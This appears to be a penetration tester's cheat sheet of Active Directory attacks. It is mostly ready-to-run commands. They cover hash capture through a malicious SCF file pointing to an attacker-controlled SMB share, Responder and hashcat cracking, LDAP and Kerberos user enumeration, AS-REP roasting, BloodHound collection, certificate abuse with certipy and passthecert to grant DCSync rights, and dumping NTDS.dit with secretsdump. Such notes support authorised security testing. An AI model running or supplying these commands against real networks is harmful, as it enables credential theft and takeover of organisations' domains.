# Active Directory Initial Attack Vectors

### SCF (Shell Command Files) FILE TO GATHER HASHES
```
[Shell]
Command=2
IconFile=\\X.X.X.X\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```

```
responder -wrf --lm -v -I eth0
```
**Crack Responder Hash**
```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
```
### SMB Relay Attack
Prerequisites
1. SMB Signing disabled on target ( SMB Signing enabled but not required or SMB Signing disabled)
1. Must be on the local network
1. User credentials must have remote login access for example; local admin to the target machine or member of the Domain Administrators group.
   
### LDAP NULL BIND
```
ldapsearch -x -b "dc=domain,dc=local" "*" -H ldap://10.10.10.169:389
```
```
ldapsearch -x -b "dc=domain,dc=local" "*" -H ldap://10.10.10.169:389 | awk '/dn: / {print $2}'
```
```
ldapsearch -x -b "dc=domain,dc=local" "objectclass=user" "description" "name" "samaccountname" -H ldap://10.10.10.169:389
```

### Kerberose User Enumeration
```
kerbrute userenum -d domain.local --dc dc_ip users.txt
```

### ASREP Roast
AS-REP roasting is an attack against Kerberos that allows password hashes to be retrieved for users that do not require pre-authentication. If the user has “Do not use Kerberos pre-authentication” enabled, then an attacker can recover a Kerberos AS-REP encrypted with the users RC4-HMAC’d password and he can attempt to crack this ticket offline.

```
impacket-GetNPUsers -dc-ip X.X.X.X doamin.local/ -usersfile users.txt -format john -outputfile hashes
```
```
john -wordlist=/usr/share/wordlists/rockyou.txt hashes
```

# Active Directory Post Compromise

### Bloodhound Ingestor 
Bloodhound is an tool which can enumerate a domain automatically, save all the information, find possible privilege escalation paths and show all the information using graphs.
Booldhound is composed of 2 main parts:
1. The ingestors are used to enumerate the domain and extract all the information in a format that the visualisation application will understand.
2. The visualisation application uses neo4j to show how all the information is related and to show different ways to escalate privileges in the domain.

```
bloodhound-python -u username -p password -ns dc_ip -d domain.local -c all
```
### LDAP Dump 
```
ldapdomaindump -u domain.local\\user -p pass -o dump_dir dc_ip
```
### Get All Domain Joined Computers
```
Get-ADComputer -Filter * -Properties  * | Select Name, DistinguishedName
```


# AD PrivEsc

### Pass the Certificate

**Extract key and cert from the pfx**
```
certipy cert -pfx "PATH_TO_PFX_CERT" -nokey -out "user.crt"
certipy cert -pfx "PATH_TO_PFX_CERT" -nocert -out "user.key"
```

**Authenticate using certificate**
```
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip X.X.X.X
```

**Elevate a user for DCSYNC with passthecert.py**
```
passthecert.py -action modify_user -crt "PATH_TO_CRT" -key "PATH_TO_KEY" -domain "domain.local" -dc-ip "DC_IP" -target "SAM_ACCOUNT_NAME" -elevate
```
### DCSync attack

**Dumping NTDS.dit**
```
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
```
